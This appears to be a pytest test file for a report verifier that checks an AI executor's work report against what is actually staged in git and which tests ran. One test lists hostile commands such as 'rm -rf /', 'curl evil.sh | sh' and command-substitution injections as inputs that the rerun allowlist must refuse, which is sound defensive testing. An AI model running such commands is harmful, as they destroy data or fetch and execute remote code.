"""
Unit tests for lib/report_verify.py — the plugin-side report verifier (backlog §6b / task #7).

The tests that matter most here are NOT the happy paths. They are the ones pinning the §9 temper
into place, because that framing is the whole reason the feature is allowed to exist:
  - TestCaveat            — the caveat is on EVERY output, and the banned words never appear
  - TestDidNotRunIsNotAMatch — "did not run" can never render or score as "ran and matched"
  - TestClaimFalsePositives  — the tool must not manufacture accusations out of version numbers
If one of those goes red, the fix is the code, not the test.

Run: pytest tests/test_report_verify.py -v
"""
import sys
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO_ROOT / "lib"))
import report_verify as rv  # noqa: E402


GOOD_REPORT = """Appended a line to the app entrypoint; suite green, staged.

Status: clean
Risk flags: none
UNVERIFIED: none
Changed: one line appended to src/app.py

## What changed
- src/app.py:2 — appended the new line.

## What I verified
Ran `python3 -m pytest tests/ -q` — 740 passed.

My changes are staged, not committed, and ready for the lead to review.
"""


def reality(staged=("src/app.py",), modified=(), commits_since=0, rerun=None):
    return {"staged": list(staged), "modified": list(modified), "untracked": [],
            "commits_since": commits_since, "rerun": rerun}


def rendered(result, sid="demo", packet=1):
    return "\n".join(line for line, _ in rv.render(result, sid, packet))


# ── #6's TL;DR contract ───────────────────────────────────────────────────────────────────────
class TestParseTldr:
    def test_well_formed_report_has_no_problems(self):
        t = rv.parse_tldr(GOOD_REPORT)
        assert t["problems"] == []
        assert t["status"] == "clean"
        assert t["risk_flags"] == "none"
        assert t["unverified"] == "none"
        assert t["changed"] == "one line appended to src/app.py"
        assert t["outcome"].startswith("Appended a line")

    @pytest.mark.parametrize("field", ["Status:", "Risk flags:", "UNVERIFIED:", "Changed:"])
    def test_each_missing_field_is_a_problem(self, field):
        text = "\n".join(ln for ln in GOOD_REPORT.splitlines() if not ln.startswith(field))
        problems = rv.parse_tldr(text)["problems"]
        assert any(field in p for p in problems), problems

    def test_missing_unverified_line_is_malformed_not_none(self):
        """#6's contract, the single most load-bearing assertion in this file: an ABSENT
        UNVERIFIED line must read as malformed, never as 'nothing to report'."""
        text = GOOD_REPORT.replace("UNVERIFIED: none\n", "")
        result = rv.verify(text, reality())
        assert result["verdict"] == rv.MALFORMED
        assert result["tldr"]["unverified"] is None
        out = rendered(result)
        assert "MALFORMED" in out
        assert "line missing" in out

    def test_empty_field_value_is_a_problem(self):
        text = GOOD_REPORT.replace("UNVERIFIED: none", "UNVERIFIED:")
        assert any("empty" in p for p in rv.parse_tldr(text)["problems"])

    def test_out_of_order_fields_are_a_problem(self):
        text = GOOD_REPORT.replace(
            "Status: clean\nRisk flags: none\nUNVERIFIED: none\n",
            "Risk flags: none\nStatus: clean\nUNVERIFIED: none\n")
        assert any("order" in p for p in rv.parse_tldr(text)["problems"])

    def test_unknown_status_value_is_a_problem(self):
        text = GOOD_REPORT.replace("Status: clean", "Status: mostly fine")
        assert any("not one of" in p for p in rv.parse_tldr(text)["problems"])

    def test_heading_first_line_is_a_problem(self):
        text = "# Report\n\n" + GOOD_REPORT
        assert any("heading" in p for p in rv.parse_tldr(text)["problems"])

    def test_label_prefixed_first_line_is_a_problem(self):
        text = "Report: did the thing.\n\n" + GOOD_REPORT.split("\n", 1)[1]
        assert any("label prefix" in p for p in rv.parse_tldr(text)["problems"])

    def test_bulleted_tldr_still_parses(self):
        """Executors bullet the block sometimes; that's ornament, not a contract violation."""
        text = GOOD_REPORT.replace("Status: clean", "- Status: clean") \
                          .replace("Risk flags: none", "- Risk flags: none") \
                          .replace("UNVERIFIED: none", "- UNVERIFIED: none") \
                          .replace("Changed: one", "- Changed: one")
        assert rv.parse_tldr(text)["problems"] == []

    def test_empty_report(self):
        assert "empty" in " ".join(rv.parse_tldr("")["problems"])


class TestIsNoneValue:
    @pytest.mark.parametrize("v", ["none", "None", " none ", "none."])
    def test_recognises_none(self, v):
        assert rv.is_none_value(v)

    @pytest.mark.parametrize("v", ["", None, "none of the tests were run", "two flags"])
    def test_rejects_everything_else(self, v):
        assert not rv.is_none_value(v)


# ── row 70 item 3: the ops report that legitimately changed nothing ───────────────────────────
class TestCleanNoChangeReport:
    """An OPS packet (investigate, verify, answer a question) stages nothing on purpose and its
    report says so. `claimed_paths` then returns an empty set, which auto-close read as "the landed
    test is unavailable" — so a finished ops session waited out the full idle timer. This is the
    positive assertion that separates "SAYS it changed nothing" from "we could parse no claims"."""

    def _report(self, changed="none", section="- nothing staged — investigation only\n",
                status="clean"):
        return (f"Investigated the deadlock; no code changed.\n\nStatus: {status}\n"
                f"Risk flags: none\nUNVERIFIED: none\nChanged: {changed}\n\n"
                f"## What changed\n{section}\n")

    @pytest.mark.parametrize("changed", ["none", "None.", "nothing", "nothing staged",
                                         "no files changed", "none — investigation only", "n/a"])
    def test_a_none_ish_changed_field_counts(self, changed):
        assert rv.clean_no_change_report(self._report(changed=changed))

    def test_a_none_ish_what_changed_section_counts_on_its_own(self):
        assert rv.clean_no_change_report(self._report(changed="see below",
                                                      section="- nothing staged\n"))

    def test_a_report_that_names_files_does_not_count(self):
        assert not rv.clean_no_change_report(self._report(changed="one module",
                                                          section="- `bin/relay:10` — thing\n"))

    @pytest.mark.parametrize("status", ["blocked", "partial", "clean-with-caveats"])
    def test_only_status_clean_counts(self, status):
        """A blocked/partial ops report has NOT finished — parking it on the landed path would
        close a session whose work is still owed."""
        assert not rv.clean_no_change_report(self._report(status=status))

    def test_a_report_with_no_tldr_at_all_does_not_count(self):
        assert not rv.clean_no_change_report("Did some things.\n\n## What changed\n- none\n")


# ── claimed files ─────────────────────────────────────────────────────────────────────────────
class TestClaimedPaths:
    def test_scoped_to_what_changed_section(self):
        text = ("intro mentioning docs/spec.md\n\n## What changed\n- bin/relay:10 — thing\n\n"
                "## Next\n- lib/other.py\n")
        paths, scoped = rv.claimed_paths(text)
        assert scoped is True
        assert paths == ["bin/relay"]

    def test_falls_back_to_whole_report_unscoped(self):
        paths, scoped = rv.claimed_paths("I edited bin/relay today.\n")
        assert scoped is False
        assert "bin/relay" in paths

    def test_bold_lead_in_naming_a_file_does_not_end_the_section(self):
        """Regression, found by running this tool on its own report: a bold lead-in that names a
        file is section CONTENT. Treating it as a heading truncated the section to nothing, so
        zero claims were checked and the run still reported COUNTS-MATCH."""
        text = ("## What changed\n\n"
                "**`lib/report_verify.py` (new, 477 lines) — the pure verdict engine.**\n"
                "- lib/report_verify.py:58 — the caveat.\n\n"
                "**`bin/relay` — CLI seam only.**\n"
                "- bin/relay:2361 — cmd_verify.\n\n"
                "## What I verified\n- docs/spec.md was consulted\n")
        paths, scoped = rv.claimed_paths(text)
        assert scoped is True
        assert "lib/report_verify.py" in paths and "bin/relay" in paths
        assert "docs/spec.md" not in paths  # the next real heading still ends the section

    def test_plain_bold_heading_still_ends_the_section(self):
        text = ("## What changed\n- bin/relay:1 — thing.\n\n"
                "**What I verified**\n- lib/other.py was read\n")
        paths, _ = rv.claimed_paths(text)
        assert paths == ["bin/relay"]

    def test_empty_section_degrades_to_unscoped_not_to_zero_claims(self):
        """An empty section yields zero claims, and zero claims would silently read as 'everything
        claimed was staged'. Degrade LOUD (unscoped/advisory), never to agreement."""
        text = "## What changed\n\n## Next\n- src/app.py\n"
        paths, scoped = rv.claimed_paths(text)
        assert scoped is False
        assert "src/app.py" in paths


class TestClaimFalsePositives:
    """The strictness that keeps this tool from manufacturing accusations. diff_render's mention
    regex is permissive on purpose (it intersects with staged files afterwards); here a false
    positive becomes a MISMATCH against an executor who did nothing wrong."""

    @pytest.mark.parametrize("blob", ["bumped 0.3.27 to 0.3.28", "v1.2.3 shipped", "took 165.97s"])
    def test_version_numbers_are_not_paths(self, blob):
        paths, _ = rv.claimed_paths(f"## What changed\n- {blob}\n")
        assert paths == [], paths

    def test_absolute_paths_are_not_claimed_as_repo_paths(self):
        paths, _ = rv.claimed_paths("## What changed\n- wrote /Users/x/.relay-tasks/a/001-report.md\n")
        assert not any(p.startswith("/") for p in paths)

    @pytest.mark.parametrize("prose,ghost", [
        ("tolerates bulleted/ornamented blocks", "bulleted/ornamented"),
        ("reuses diff_render.parse_report_mentions here", "diff_render.parse_report_mentions"),
    ])
    def test_technical_prose_does_not_become_a_claim(self, prose, ghost):
        """Both found by running this tool on its own report. A false MISMATCH is the expensive
        error — it costs trust an executor has not actually spent."""
        paths, _ = rv.claimed_paths(f"## What changed\n- {prose}\n")
        assert ghost not in rv.plausible_claims(paths, repo_entries={"bin", "lib"}, staged=[])

    def test_extensionless_repo_path_stays_checkable(self):
        paths, _ = rv.claimed_paths("## What changed\n- bin/relay:10 — thing\n")
        assert rv.plausible_claims(paths, repo_entries={"bin", "lib"}, staged=[]) == ["bin/relay"]

    def test_without_repo_entries_only_extension_paths_survive(self):
        """Worktree gone → keep only the non-accusing direction."""
        kept = rv.plausible_claims(["bin/relay", "lib/x.py"], repo_entries=(), staged=[])
        assert kept == ["lib/x.py"]

    def test_a_staged_path_is_never_filtered_out(self):
        kept = rv.plausible_claims(["bin/relay"], repo_entries=(), staged=["bin/relay"])
        assert kept == ["bin/relay"]

    def test_real_paths_still_recognised(self):
        paths, _ = rv.claimed_paths("## What changed\n- lib/report_verify.py:5, README.md, bin/relay\n")
        assert paths == ["lib/report_verify.py", "README.md", "bin/relay"]


# ── row 76: a mention is not a claim ─────────────────────────────────────────────────────────
class TestClaimNegationAndTemplateFilters:
    """The three real shapes that produced four false MISMATCH gate-blocks (backlog row 76,
    2026-09-07/12). All three text snippets below are the ACTUAL wording from the field reports."""

    def test_shape_1_disclaimer_is_not_a_claim(self):
        text = ("## What changed\n"
                "- grepped `tests/test_diff_render.py` and deliberately did NOT change it\n")
        paths, _ = rv.claimed_paths(text)
        assert "tests/test_diff_render.py" not in paths

    def test_shape_2_negated_mention_is_not_a_claim(self):
        text = "## What changed\n- `bin/relay` untouched — confirmed empty diff\n"
        paths, _ = rv.claimed_paths(text)
        assert "bin/relay" not in paths

    def test_shape_3_path_template_is_not_a_claim(self):
        text = ("## What changed\n"
                "- the marker lives at `~/.relay-tasks/<sid>/session.json`, per the footnote\n")
        paths, _ = rv.claimed_paths(text)
        assert not any("<" in p or ">" in p for p in paths)
        assert "sid>/session.json" not in paths

    def test_positive_control_a_genuine_prose_claim_still_harvests(self):
        """The filters must not go blind: an honest claim in ordinary prose is still a claim."""
        text = "## What changed\n- modified `lib/foo.py` to fix the off-by-one.\n"
        paths, _ = rv.claimed_paths(text)
        assert "lib/foo.py" in paths

    @pytest.mark.parametrize("cue,claim", [
        ("bin/relay is unchanged this round", "bin/relay"),
        ("we only read lib/other.py, nothing written", "lib/other.py"),
        ("no changes to docs/spec.md", "docs/spec.md"),
        ("lib/x.py was left alone", "lib/x.py"),
        ("read-only pass over bin/relay", "bin/relay"),
    ])
    def test_each_negation_cue_suppresses_its_claim(self, cue, claim):
        paths, _ = rv.claimed_paths(f"## What changed\n- {cue}\n")
        assert claim not in paths

    def test_dropped_claims_are_visible_not_silent(self):
        """Rule 4: a drop must be explainable, not magic."""
        text = ("## What changed\n"
                "- grepped `tests/test_diff_render.py` and deliberately did NOT change it\n")
        dropped = dict(rv.ignored_claims(text))
        assert "tests/test_diff_render.py" in dropped
        assert "not a claim" in dropped["tests/test_diff_render.py"]

    def test_ignored_claims_omits_a_path_genuinely_claimed_elsewhere(self):
        """A path dropped in one spot but claimed for real elsewhere is not 'ignored' — it IS a
        claim, just not from that mention."""
        text = ("## What changed\n"
                "- bin/relay untouched here\n"
                "- modified `bin/relay` to add a flag\n")
        paths, _ = rv.claimed_paths(text)
        assert "bin/relay" in paths
        assert "bin/relay" not in dict(rv.ignored_claims(text))

    def test_verify_renders_the_advisory_line_for_a_dropped_mention(self):
        text = (GOOD_REPORT.replace(
            "## What changed\n- src/app.py:2 — appended the new line.\n",
            "## What changed\n- src/app.py:2 — appended the new line.\n"
            "- grepped `tests/test_diff_render.py` and deliberately did NOT change it\n"))
        result = rv.verify(text, reality())
        assert result["verdict"] == rv.COUNTS_MATCH
        out = rendered(result)
        assert "ignored as a non-claim: tests/test_diff_render.py" in out


# ── gate-171051-r2 fix 1: a negation cue is scoped to its CLAUSE, not the whole line/bullet ─────
class TestNegationClauseScoping:
    """Reviewer should-fix on the row-76 negation filter: one cue anywhere on a line/bullet used to
    forgive EVERY path on it. These are the reviewer's own three reproductions — each must now
    yield the genuinely-claimed path instead of forgiving it too."""

    def test_but_does_not_carry_a_cue_across_to_the_next_claim(self):
        text = "## What changed\n- did not change a.py, but modified b.py\n"
        paths, _ = rv.claimed_paths(text)
        assert "b.py" in paths
        assert "a.py" not in paths

    def test_then_does_not_carry_a_cue_across_to_the_next_claim(self):
        text = "## What changed\n- grepped for callers, then modified lib/x.py\n"
        paths, _ = rv.claimed_paths(text)
        assert "lib/x.py" in paths

    def test_a_wrapped_continuation_clause_does_not_reach_back_to_the_first_line(self):
        text = ("## What changed\n"
                "- modified lib/x.py to fix the bug\n"
                "  (left lib/y.py unchanged)\n")
        paths, _ = rv.claimed_paths(text)
        assert "lib/x.py" in paths
        assert "lib/y.py" not in paths  # its own clause still carries "unchanged" — separately


# ── row 76 rule 1: the TL;DR Changed: line is the primary claim source ────────────────────────
class TestChangedLineIsPrimarySource:
    def test_changed_line_paths_are_claimed_even_when_what_changed_prose_differs(self):
        text = ("Did the thing.\n\nStatus: clean\nRisk flags: none\nUNVERIFIED: none\n"
                "Changed: lib/foo.py\n\n"
                "## What changed\nSee lib/foo.py for the fix; the rest of this bullet is just "
                "prose with no other file mentioned.\n")
        paths, scoped = rv.claimed_paths(text)
        assert paths == ["lib/foo.py"]
        assert scoped is True

    def test_changed_line_is_primary_prose_only_adds_genuine_claims(self):
        """gate-171051-r2 rule 2: a prose addition needs a claiming verb in its OWN clause — so
        this uses `modified`, one of `_CLAIM_VERBS`, rather than an arbitrary synonym."""
        text = ("Did the thing.\n\nStatus: clean\nRisk flags: none\nUNVERIFIED: none\n"
                "Changed: lib/foo.py\n\n"
                "## What changed\n"
                "- lib/foo.py:1 — the fix.\n"
                "- also modified lib/bar.py for a helper.\n"
                "- bin/relay untouched — confirmed empty diff.\n")
        paths, scoped = rv.claimed_paths(text)
        assert paths == ["lib/foo.py", "lib/bar.py"]
        assert scoped is True

    def test_a_negated_changed_line_contributes_no_claim(self):
        text = ("Did the thing.\n\nStatus: clean\nRisk flags: none\nUNVERIFIED: none\n"
                "Changed: bin/relay untouched, confirmed empty diff\n\n"
                "## What changed\n- lib/foo.py:1 — the fix.\n")
        paths, _ = rv.claimed_paths(text)
        assert "bin/relay" not in paths
        assert paths == ["lib/foo.py"]

    def test_no_changed_line_falls_back_to_what_changed_section(self):
        """Unaffected pre-existing behaviour when there is no TL;DR at all."""
        text = "intro\n\n## What changed\n- bin/relay:10 — thing\n"
        paths, scoped = rv.claimed_paths(text)
        assert scoped is True
        assert paths == ["bin/relay"]


# ── gate-171051-r2 fix 2: Changed: is primary, prose only ADDS clearly-claiming paths ───────────
class TestChangedLinePrimaryProseNeedsAClaimingVerb:
    """The 001 report's own should-fix: `claimed_paths` used to merge Changed-line paths with
    EVERY prose path unconditionally, so the structured field never actually narrowed anything —
    including this session's own 001 report, which quoted a fixture VALUE (`src/app.py`, the
    fixture's own `Changed:` text) in a "What changed" bullet describing a test fixture, and had
    that quoting read back as a second, false claim on `src/app.py`."""

    def test_a_quoted_fixture_value_is_not_a_claim(self):
        """The actual gate-171051 001 shape, reproduced at report scale: real work is the
        `Changed:` line's path; a later bullet quotes an unrelated fixture's old `Changed:` text
        (which happens to name `src/app.py`) purely to explain what the fixture used to say."""
        text = ("Fixed the claim scraper; staged.\n\n"
                "Status: clean\nRisk flags: none\nUNVERIFIED: none\n"
                "Changed: lib/report_verify.py\n\n"
                "## What changed\n"
                "- lib/report_verify.py:5 — added the clause-scoping helper.\n"
                "- the test fixture's `Changed:` line said `src/app.py`, but that was only the "
                "fixture's stale text.\n")
        paths, scoped = rv.claimed_paths(text)
        assert paths == ["lib/report_verify.py"]
        assert "src/app.py" not in paths
        assert scoped is True
        dropped = dict(rv.ignored_claims(text))
        assert dropped["src/app.py"] == "not in Changed: line and no claiming verb"

    def test_positive_control_a_claiming_verb_still_adds_the_path(self):
        """Once a `Changed:` line is primary, a prose path is NOT forever locked out — a real
        claiming verb in its own clause still adds it (see also
        `TestChangedLineIsPrimarySource.test_changed_line_is_primary_prose_only_adds_genuine_claims`,
        which pins the same rule end to end)."""
        text = ("Did the thing.\n\nStatus: clean\nRisk flags: none\nUNVERIFIED: none\n"
                "Changed: lib/foo.py\n\n"
                "## What changed\n"
                "- lib/foo.py:1 — the fix.\n"
                "- created lib/newfile.py for the shared helper.\n")
        paths, _ = rv.claimed_paths(text)
        assert paths == ["lib/foo.py", "lib/newfile.py"]

    def test_positive_control_no_changed_line_still_harvests_plain_prose(self):
        """Rule 2 only ever narrows prose ADDED alongside a primary `Changed:` line. With no
        `Changed:` line at all, a plain prose mention — no claiming verb needed — is still a claim,
        exactly as before this rule existed."""
        text = "## What changed\n- src/app.py:2 — appended the new line.\n"
        paths, scoped = rv.claimed_paths(text)
        assert paths == ["src/app.py"]
        assert scoped is True


class TestAbsolutePathRejectReason:
    """Reviewer finding 4 on the row-76 fix: rejecting EVERY leading `/` (rather than only a path
    that would resolve outside the repo) is kept — the simpler, non-accusing direction — but now
    carries its OWN reason (`absolute path`) instead of sharing the path-template one, so a dropped
    absolute path is legible in `ignored_claims` rather than reading as an unrelated `<sid>`-style
    template match.

    `_CLAIM_RE` cannot itself produce a match starting with `/` — its lookbehind refuses a match
    immediately after a `/`, and no branch's character class allows `/` as a first character — so
    this is a direct unit test of the reject-reason helper rather than an end-to-end
    `claimed_paths`/`ignored_claims` case; there is no report text that reaches this branch through
    the real scraper today."""

    def test_absolute_path_gets_its_own_reason(self):
        assert rv._claim_reject_reason("/README.md") == "absolute path"

    def test_template_and_home_paths_keep_the_template_reason(self):
        assert rv._claim_reject_reason("sid>/session.json") == \
            "path template or filesystem reference, not a repo path"
        assert rv._claim_reject_reason("~/.relay-tasks/x") == \
            "path template or filesystem reference, not a repo path"


# ── staged reality ────────────────────────────────────────────────────────────────────────────
class TestStagedReality:
    def test_truthful_report_counts_match(self):
        result = rv.verify(GOOD_REPORT, reality())
        assert result["verdict"] == rv.COUNTS_MATCH
        assert result["claimed_missing"] == []

    def test_claimed_but_never_staged_is_a_mismatch_naming_the_file(self):
        text = GOOD_REPORT.replace("- src/app.py:2 — appended the new line.",
                                   "- src/app.py:2 — appended the new line.\n- docs/notes.md — rewrote it.")
        result = rv.verify(text, reality())
        assert result["verdict"] == rv.MISMATCH
        assert "docs/notes.md" in rendered(result)

    def test_modified_but_unstaged_says_so_specifically(self):
        text = GOOD_REPORT.replace("- src/app.py:2", "- docs/notes.md:1 — rewrote it.\n- src/app.py:2")
        result = rv.verify(text, reality(modified=["docs/notes.md"]))
        assert result["verdict"] == rv.MISMATCH
        assert "but NOT staged" in rendered(result)

    # ── row 70 item 6 (issue 05-verify-relative-path-mismatch.md) ────────────────────────────────
    # Observed on gm-app-000221-r6: the report's "What changed" listed `lib/types.ts`,
    # `components/DetailPane.svelte` — relative to `app/src`, which its own section header named.
    # All 21 files were staged under `app/src/...`. verify printed MISMATCH and a ✗ per file, and
    # the lead had to read the whole list to see it was a path-resolution false positive.

    SUBDIR_REPORT = ("Rewrote the detail pane; suite green, staged, not committed.\n\n"
                     "Status: clean\nRisk flags: none\nUNVERIFIED: none\nChanged: two files\n\n"
                     "## What changed (paths relative to `app/src`)\n"
                     "- `lib/types.ts:4` — added the Thread type\n"
                     "- `components/DetailPane.svelte:20` — renders it\n")

    def test_a_unique_staged_suffix_match_is_confirmed_not_accused(self):
        result = rv.verify(self.SUBDIR_REPORT,
                           reality(staged=["app/src/lib/types.ts",
                                           "app/src/components/DetailPane.svelte"]))
        assert result["verdict"] == rv.COUNTS_MATCH
        assert result["claimed_missing"] == []
        assert sorted(result["claimed_staged"]) == ["components/DetailPane.svelte", "lib/types.ts"]

    def test_a_suffix_matched_claim_is_not_also_counted_as_unclaimed(self):
        result = rv.verify(self.SUBDIR_REPORT,
                           reality(staged=["app/src/lib/types.ts",
                                           "app/src/components/DetailPane.svelte"]))
        assert result["unclaimed"] == []

    def test_the_resolution_is_said_out_loud(self):
        result = rv.verify(self.SUBDIR_REPORT,
                           reality(staged=["app/src/lib/types.ts",
                                           "app/src/components/DetailPane.svelte"]))
        out = rendered(result)
        assert "lib/types.ts — resolved to staged `app/src/lib/types.ts`" in out

    def test_an_ambiguous_suffix_stays_a_mismatch_naming_both(self):
        """Two staged files could be meant — the tool must not pick one. It stays a mismatch, and
        says which candidates it saw so the reader can settle it in one glance."""
        result = rv.verify(self.SUBDIR_REPORT,
                           reality(staged=["app/src/lib/types.ts", "web/src/lib/types.ts",
                                           "app/src/components/DetailPane.svelte"]))
        assert result["verdict"] == rv.MISMATCH
        assert "lib/types.ts" in result["claimed_missing"]
        out = rendered(result)
        assert "matches 2 staged paths" in out
        assert "app/src/lib/types.ts" in out and "web/src/lib/types.ts" in out

    def test_a_claim_that_is_a_real_repo_file_is_never_suffix_resolved(self):
        """`lib/types.ts` really exists at the repo root here — the report meant THAT file, which
        is not staged. Resolving it against a deeper staged path would hide a real mismatch."""
        r = reality(staged=["app/src/lib/types.ts", "app/src/components/DetailPane.svelte"])
        r["repo_files"] = ["lib/types.ts"]
        result = rv.verify(self.SUBDIR_REPORT, r)
        assert result["verdict"] == rv.MISMATCH
        assert "lib/types.ts" in result["claimed_missing"]

    def test_suffix_matching_respects_segment_boundaries(self):
        """`lib/types.ts` must not match `app/mylib/types.ts` — a suffix that starts mid-segment is
        a different file, and matching it would be a manufactured confirmation."""
        text = ("Did it; staged, not committed.\n\nStatus: clean\nRisk flags: none\n"
                "UNVERIFIED: none\nChanged: one file\n\n## What changed\n- `lib/types.ts`\n")
        result = rv.verify(text, reality(staged=["app/mylib/types.ts"]))
        assert result["verdict"] == rv.MISMATCH
        assert result["claimed_missing"] == ["lib/types.ts"]

    def test_unscoped_claim_is_advisory_not_a_mismatch(self):
        """With no 'What changed' section the tool cannot tell 'I changed x' from 'I read x', so
        it must not accuse. A missed catch is cheaper than a false one."""
        text = ("Did the thing.\n\nStatus: clean\nRisk flags: none\nUNVERIFIED: none\n"
                "Changed: stuff\n\nI consulted docs/spec.md and edited src/app.py, staged not committed.\n")
        result = rv.verify(text, reality())
        assert result["claims_scoped"] is False
        assert result["verdict"] == rv.COUNTS_MATCH
        assert any(f["code"] == "claimed-not-staged-unscoped" for f in result["findings"])

    def test_staged_but_unclaimed_is_only_a_note(self):
        result = rv.verify(GOOD_REPORT, reality(staged=["src/app.py", "extra.py"]))
        assert result["verdict"] == rv.COUNTS_MATCH
        assert any(f["code"] == "staged-not-claimed" and f["level"] == "note"
                   for f in result["findings"])

    def test_staged_confirmation_over_an_empty_index_is_a_mismatch(self):
        result = rv.verify(GOOD_REPORT, reality(staged=[]))
        assert result["verdict"] == rv.MISMATCH
        assert "EMPTY" in rendered(result)

    def test_empty_index_with_no_claims_is_only_a_note(self):
        text = ("Blocked before touching anything.\n\nStatus: blocked\nRisk flags: none\n"
                "UNVERIFIED: none\nChanged: nothing\n\n## What changed\nNothing.\n")
        result = rv.verify(text, reality(staged=[]))
        assert result["verdict"] == rv.COUNTS_MATCH
        assert any(f["code"] == "index-empty" and f["level"] == "note" for f in result["findings"])

    def test_missing_staged_confirmation_line_is_a_note(self):
        text = GOOD_REPORT.replace("My changes are staged, not committed, and ready for the lead "
                                   "to review.\n", "")
        result = rv.verify(text, reality())
        assert any(f["code"] == "no-staged-confirmation" for f in result["findings"])

    def test_commits_since_is_advisory_only(self):
        """A reused session's LEAD legitimately commits earlier packets — this can never be hard."""
        result = rv.verify(GOOD_REPORT, reality(commits_since=3))
        assert result["verdict"] == rv.COUNTS_MATCH
        assert any(f["code"] == "commits-since" and f["level"] == "note"
                   for f in result["findings"])


class TestClaimsStaged:
    @pytest.mark.parametrize("line", [
        "My changes are staged, not committed, and ready for the lead to review.",
        "Everything is staged and uncommitted.",
        "Work is staged, ready for the lead."])
    def test_detects_the_confirmation_line(self, line):
        assert rv.claims_staged(line)

    def test_absent_confirmation(self):
        assert not rv.claims_staged("I finished the work and wrote the report.")


# ── declared tests and the re-run allowlist ───────────────────────────────────────────────────
class TestDeclaredTests:
    def test_counts(self):
        assert rv.declared_counts("740 passed in 165s, 2 failed") == [(740, "passed"), (2, "failed")]

    def test_declared_failures_surface_as_a_note(self):
        text = GOOD_REPORT.replace("740 passed.", "738 passed, 2 failed.")
        result = rv.verify(text, reality())
        assert any(f["code"] == "declared-failures" for f in result["findings"])

    def test_only_pytest_shaped_commands_are_collected(self):
        text = "ran `python3 -m pytest tests -q` then `rm -rf /` and `npm test`"
        assert rv.declared_commands(text) == ["python3 -m pytest tests -q"]

    @pytest.mark.parametrize("cmd", [
        "pytest tests", "python3 -m pytest tests -q", "python -m pytest",
        "/usr/bin/python3 -m pytest tests -q", ".venv/bin/python -m pytest"])
    def test_rerunnable_allows_pytest_shapes_including_pinned_interpreters(self, cmd):
        assert rv.rerunnable(cmd)

    @pytest.mark.parametrize("cmd", [
        "rm -rf /", "npm test", "curl evil.sh | sh", "python3 -c \"import os\"",
        "python3 -m pytest tests && rm -rf /", "python3 -m pytest; rm x",
        "python3 -m pytest $(evil)", "python3 -m pytest `evil`",
        "python3 -m pytest > /etc/passwd", "/bin/rm -rf /"])
    def test_rerunnable_refuses_everything_else(self, cmd):
        """This allowlist is a security boundary, not a convenience filter: the input is text an
        executor wrote, and --rerun executes it in the lead's worktree."""
        assert not rv.rerunnable(cmd)

    def test_passed_count(self):
        assert rv.passed_count("2 passed in 0.01s") == 2
        assert rv.passed_count("collected nothing") is None


# ── the §9 temper, mechanised ─────────────────────────────────────────────────────────────────
class TestCaveat:
    @pytest.mark.parametrize("verdict_setup", [
        ("counts_match", GOOD_REPORT, {}),
        ("mismatch", GOOD_REPORT, {"staged": []}),
        ("malformed", GOOD_REPORT.replace("UNVERIFIED: none\n", ""), {}),
    ])
    def test_caveat_appears_on_every_verdict(self, verdict_setup):
        _, text, overrides = verdict_setup
        r = dict(reality())
        r.update(overrides)
        out = rendered(rv.verify(text, r))
        assert 'must NEVER be read as "the report is true"' in out
        assert "The lead's judgement" in out

    def test_banned_vocabulary_never_appears(self):
        """Verdicts must be structurally impossible to over-read. No PASS, no VERIFIED, no clean."""
        outs = [rendered(rv.verify(GOOD_REPORT, reality())),
                rendered(rv.verify(GOOD_REPORT, reality(staged=[]))),
                rendered(rv.verify(GOOD_REPORT.replace("UNVERIFIED: none\n", ""), reality()))]
        for out in outs:
            verdict_line = next(ln for ln in out.splitlines() if "VERDICT:" in ln)
            for banned in ("PASS", "VERIFIED", "OK", "GREEN"):
                assert banned not in verdict_line, verdict_line
        assert set(rv.EXIT_CODES) == {rv.COUNTS_MATCH, rv.MISMATCH, rv.MALFORMED, rv.INCONCLUSIVE}

    def test_counts_match_output_says_it_is_a_ceiling(self):
        out = rendered(rv.verify(GOOD_REPORT, reality()))
        assert "ceiling of what this tool can say" in out

    def test_premise_level_wrongness_is_named_as_invisible(self):
        out = rendered(rv.verify(GOOD_REPORT, reality()))
        assert "wrong venv" in out and "INVISIBLE" in out


class TestRiskEcho:
    def test_risk_flags_and_unverified_are_echoed_verbatim(self):
        text = GOOD_REPORT.replace("Risk flags: none", "Risk flags: weakened a parity assertion") \
                          .replace("UNVERIFIED: none", "UNVERIFIED: assumed the CI venv matches")
        out = rendered(rv.verify(text, reality()))
        assert "weakened a parity assertion" in out
        assert "assumed the CI venv matches" in out
        assert "NOT assessed here" in out

    def test_risk_flags_do_not_change_the_verdict(self):
        """The verifier SURFACES risk, it never absorbs or grades it — that stays lead judgement."""
        text = GOOD_REPORT.replace("Risk flags: none", "Risk flags: touches core ledger logic")
        assert rv.verify(text, reality())["verdict"] == rv.COUNTS_MATCH

    def test_none_is_echoed_as_the_reports_own_claim(self):
        out = rendered(rv.verify(GOOD_REPORT, reality()))
        assert "echoed, not confirmed" in out


class TestDidNotRunIsNotAMatch:
    """§9.6a, mechanised: 'did not run' must never look — or score — like 'ran and matched'."""

    def test_default_run_renders_not_re_run_and_stays_counts_match(self):
        result = rv.verify(GOOD_REPORT, reality())
        assert result["verdict"] == rv.COUNTS_MATCH
        assert "NOT RE-RUN" in rendered(result)

    def test_rerun_with_no_parsable_count_is_inconclusive_not_counts_match(self):
        """The live failure that created this verdict: pytest resolved to an interpreter that had
        no pytest, so the 'run' produced nothing — which must not read as agreement."""
        r = reality(rerun=[{"cmd": "python3 -m pytest tests -q", "passed": None, "declared": 740}])
        result = rv.verify(GOOD_REPORT, r)
        assert result["verdict"] == rv.INCONCLUSIVE
        out = rendered(result)
        assert "did not run" in out
        assert "nothing was compared" in out.lower()

    def test_rerun_requested_but_nothing_runnable_is_inconclusive(self):
        result = rv.verify(GOOD_REPORT, reality(rerun=[]))
        assert result["verdict"] == rv.INCONCLUSIVE
        assert "did NOT happen" in rendered(result)

    def test_rerun_with_nothing_declared_to_compare_is_inconclusive(self):
        r = reality(rerun=[{"cmd": "pytest", "passed": 12, "declared": None}])
        assert rv.verify(GOOD_REPORT, r)["verdict"] == rv.INCONCLUSIVE

    def test_rerun_counts_differ_is_a_mismatch(self):
        r = reality(rerun=[{"cmd": "pytest", "passed": 2, "declared": 3}])
        result = rv.verify(GOOD_REPORT, r)
        assert result["verdict"] == rv.MISMATCH
        assert "2 passed, but the report declares 3" in rendered(result)

    def test_rerun_counts_agree_is_counts_match(self):
        r = reality(rerun=[{"cmd": "pytest", "passed": 740, "declared": 740}])
        assert rv.verify(GOOD_REPORT, r)["verdict"] == rv.COUNTS_MATCH


class TestVerdictPrecedence:
